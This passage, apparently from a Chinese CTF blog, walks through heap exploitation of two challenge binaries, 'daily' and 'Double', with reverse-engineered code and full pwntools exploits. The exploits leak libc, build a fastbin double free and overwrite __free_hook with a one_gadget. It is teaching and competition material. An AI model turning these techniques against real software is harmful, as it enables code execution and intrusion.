class=\"code\"><pre><span class=\"line\">.text:0000000000400C24                 mov     eax, [rbp+index]</span><br><span class=\"line\">.text:0000000000400C27                 cdqe</span><br><span class=\"line\">.text:0000000000400C29                 shl     rax, 4</span><br><span class=\"line\">.text:0000000000400C2D                 add     rax, 602068h</span><br><span class=\"line\">.text:0000000000400C33                 mov     rax, [rax]</span><br><span class=\"line\">.text:0000000000400C36                 mov     rdi, rax        ; ptr</span><br><span class=\"line\">.text:0000000000400C39                 call    free</span><br></pre></td></tr></table></figure>\n<h4 id=\"upgrade\"><a href=\"#upgrade\" class=\"headerlink\" title=\"upgrade\"></a>upgrade</h4><p>根据存储的size向bss段中写。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>首先通过正常方法leak出libc：即放入unsorted bin后，再申请出来。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">'a'</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 2 </span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"e\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr = u64(p.recvuntil(<span class=\"string\">\"2 :\"</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">\"bbbbbbbb\"</span>)[<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)) - (<span class=\"number\">0xd0</span> + <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = libc_addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc.address)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(heap_addr)</span><br></pre></td></tr></table></figure>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>利用上述提到的漏洞，在堆上构造fake chunk和指向fake chunk的指针，然后构建fastbin 2free.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">fake_chunk += <span class=\"string\">\"a\"</span> * <span class=\"number\">0x60</span></span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(heap_addr + <span class=\"number\">0x1f0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">bss = <span class=\"number\">0x602068</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x200</span>, fake_chunk) <span class=\"comment\"># 0x1a0</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = (heap_addr + <span class=\"number\">0x1f0</span> + <span class=\"number\">0x60</span> + <span class=\"number\">0x18</span> - bss) / <span class=\"number\">16</span></span><br><span class=\"line\">free(str(offset))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">5</span>, fake_chunk)</span><br><span class=\"line\">free(str(offset))</span><br></pre></td></tr></table></figure>\n<p>此时：</p>\n<p>fd -&gt; fake_chunk -&gt;idx0 -&gt;fake_chunk</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap bins</span><br><span class=\"line\">[+] No Tcache in this version of libc</span><br><span class=\"line\">────────────────────── Fastbins for arena 0x7fc5dc6d9b20 ──────────────────────</span><br><span class=\"line\">Fastbins[idx=0, size=0x10] 0x00</span><br><span class=\"line\">Fastbins[idx=1, size=0x20] 0x00</span><br><span class=\"line\">Fastbins[idx=2, size=0x30] 0x00</span><br><span class=\"line\">Fastbins[idx=3, size=0x40] 0x00</span><br><span class=\"line\">Fastbins[idx=4, size=0x50] 0x00</span><br><span class=\"line\">Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x25a01f0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x25a0010, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x25a01f0, size=0x70, flags=PREV_INUSE)  →  [loop detected]</span><br></pre></td></tr></table></figure>\n<p>但是本题操蛋的是，四个one_gadget对malloc_hook都不行，所以只能尝试free_hook。但是不能直接劫持free_hook,所以我们尝试修改top，劫持到free_hook——不过，此路也走不通，因为没开pie，堆地址不是0x55开头。其实，sb了，直接劫持到bss段即可用change和add方法实现任意读写</p>\n<h4 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./daily\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./daily\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"of daily:\"</span>)</span><br><span class=\"line\">    p.sendline(str(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"daily\\n\"</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"of daily:\"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"daily\\n\"</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"daily:\"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">'a'</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 2 </span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"e\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span> * <span class=\"number\">0x8</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr = u64(p.recvuntil(<span class=\"string\">\"2 :\"</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">\"bbbbbbbb\"</span>)[<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)) - <span class=\"number\">0x120</span></span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = libc_addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">free_hook = libc.symbols[<span class=\"string\">'__free_hook'</span>]</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc.address)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(heap_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">bss = <span class=\"number\">0x602068</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x4526a</span>\t <span class=\"comment\"># 0x4526a 0xf02a4 0xf1147</span></span><br><span class=\"line\">one_gadget += libc.address</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># make fake chunk in heap</span></span><br><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">fake_chunk += <span class=\"string\">\"a\"</span> * <span class=\"number\">0x60</span></span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0x60</span>) + p64(heap_addr + <span class=\"number\">0x1f0</span>) <span class=\"comment\"># fake array_item</span></span><br><span class=\"line\">add(<span class=\"number\">0x200</span>, fake_chunk) <span class=\"comment\"># 0x1f0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># make fastbin double free</span></span><br><span class=\"line\">offset = (heap_addr + <span class=\"number\">0x1f0</span> + <span class=\"number\">0x60</span> + <span class=\"number\">0x18</span> - bss) / <span class=\"number\">16</span></span><br><span class=\"line\">free(str(offset))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">5</span>, fake_chunk)</span><br><span class=\"line\">free(str(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fastbin attack</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0x6020d8</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, payload) <span class=\"comment\"># idx0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"C\"</span> * <span class=\"number\">0x10</span>) </span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"C\"</span> * <span class=\"number\">0x10</span>) </span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, <span class=\"string\">\"D\"</span> * <span class=\"number\">0x10</span>) <span class=\"comment\"># mark in bss</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, p64(free_hook))</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">8</span>, p64(one_gadget))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x02-Double\"><a href=\"#0x02-Double\" class=\"headerlink\" title=\"0x02  Double\"></a>0x02  Double</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/Double$ checksec pwn</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/Double/pwn&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>注意部分开启了RELRO，且没有开启PIE。从题目名字推测应该也是用double free。</p>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>通过逆向，ptr的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ptr</span>&#123;</span></span><br><span class=\"line\">  num; \t\t\t<span class=\"comment\">// + 0x0</span></span><br><span class=\"line\">  size; \t\t<span class=\"comment\">// + 0x4</span></span><br><span class=\"line\">  *content; <span class=\"comment\">// + 0x8</span></span><br><span class=\"line\">  *next;    <span class=\"comment\">// + 0x10</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"new\"><a href=\"#new\" class=\"headerlink\" title=\"new\"></a>new</h4><p>首先malloc一个0x18的chunk，然后用input函数读入chunk的内容，注意当读入0x100个字节而没有\\n时，会返回0xff。</p>\n<p>然后如果是第一次申请，或者该次与prev_ptr的字符串内容不同时，会根据size+1创建一个malloc一个chunk，然后从栈上拷贝size+1的数据到新创建的堆块中，然后再ptr结构体中设置好size和新chunk的指针。如果head_ptr不为null，会令num= prev_ptr的num+ 1，并且将prev_ptr的next指针设置为当前指针；否则，令num为0，然后令head_ptr = 当前指针。最后，还会令prev_ptr指向当前指针。</p>\n<p>如果不是第一次申请，或者该次与prev_ptr的字符串内容相同，那么直接令num++，size = prev_ptr.size，content也指向prev_ptr.content，next = null，然后将prev_ptr的next指针指向当前ptr，最后，令prev_ptr指向当前指针。</p>\n<p>由上述分析，我们知道该题是用一个单向链表结构管理堆块的， bss段存储链表的头指针head_ptr和尾指针prev_ptr，每个ptr结构中都存储了next指针，这时我感觉该题应该是要构造类型混淆。另外还有一个点就是如果两次创建相同内容的堆块，则会构造出两个指针指向同一块内存空间。另外，num都是根据prev_ptr判断的。</p>\n<h4 id=\"list\"><a href=\"#list\" class=\"headerlink\" title=\"list\"></a>list</h4><p>从head_ptr起开始遍历链表，找到相应编号的chunk，并puts出来。</p>\n<h4 id=\"edit\"><a href=\"#edit\" class=\"headerlink\" title=\"edit\"></a>edit</h4><p>从head_ptr起开始遍历，找到后先读入chunk内容，如果size小于等于原来的size，直接memcpy；否则，malloc一个新chunk，然后copy并记录到相应ptr上。</p>\n<h4 id=\"delete-1\"><a href=\"#delete-1\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>从head_ptr开始遍历，找到后先free content堆块，再free ptr堆块。在删除头和非头时操作不同。这里明显存在UAF漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">delete</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> index; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *ptr; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 Prev_ptr; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !head_ptr )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"List empty\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Info index: \"</span>);</span><br><span class=\"line\">  index = sub_401A6A();</span><br><span class=\"line\">  ptr = (<span class=\"keyword\">void</span> *)head_ptr;</span><br><span class=\"line\">  Prev_ptr = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Index not found\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( index == *(_DWORD *)ptr )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    Prev_ptr = (__int64)ptr;</span><br><span class=\"line\">    ptr = (<span class=\"keyword\">void</span> *)*((_QWORD *)ptr + <span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Prev_ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_QWORD *)(Prev_ptr + <span class=\"number\">16</span>) = *((_QWORD *)ptr + <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ptr == (<span class=\"keyword\">void</span> *)prev_ptr )</span><br><span class=\"line\">      prev_ptr = Prev_ptr;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)ptr + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    head_ptr = *((_QWORD *)ptr + <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ptr == (<span class=\"keyword\">void</span> *)prev_ptr )</span><br><span class=\"line\">      prev_ptr = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)ptr + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Success\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>首先需要leak libc，然后改got表为one_gadget即可。思考一下怎样布局，leak libc。</p>\n<h4 id=\"leak-libc-1\"><a href=\"#leak-libc-1\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>因为leak的都是content指针指向的堆块，所以只要让两个content指针指向同一个unsorted bin，先将它free，再show出来即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"b\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>) <span class=\"comment\"># head is 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"劫持控制流-1\"><a href=\"#劫持控制流-1\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>我们完全可以按daily的思路，构造fastbin attack，然后就可以劫持到任意地址。首先尝试直接劫持到malloc_hook之前的地址，但是由于必须写很多数据，失败。</p>\n<p>所以不能再用fastbin attack的思路了，尝试构造类型混淆。</p>\n<p>首先创建三个0x10的content</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x10 * &quot;a&quot; + &quot;\\n&quot;) # 4</span><br><span class=\"line\">add(0x10 * &quot;a&quot; + &quot;\\n&quot;) # 5</span><br><span class=\"line\">add(0x10 * &quot;a&quot; + &quot;\\n&quot;) # 6</span><br><span class=\"line\">free(5)</span><br><span class=\"line\">free(6)</span><br></pre></td></tr></table></figure>\n<p>然后free掉，使得fastbin为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p6-&gt;c4-&gt;p5-&gt;c4</span><br></pre></td></tr></table></figure>\n<p>然后再分配：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x20 * &quot;a&quot; + &quot;\\n&quot;) # 5</span><br></pre></td></tr></table></figure>\n<p>true_p5 = old_p6 true_c5 = other</p>\n<p>此时，fastbin为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c4-&gt;p5-&gt;c4</span><br></pre></td></tr></table></figure>\n<p>再分配</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x10 * &quot;b&quot; + &quot;\\n&quot;) # 6</span><br></pre></td></tr></table></figure>\n<p>true_p6 = ord_c4，此时，修改c4就可以修改true_p6，然后也就实现了任意地址读写</p>\n<figure class=\"highlight python\"><table><tr><td 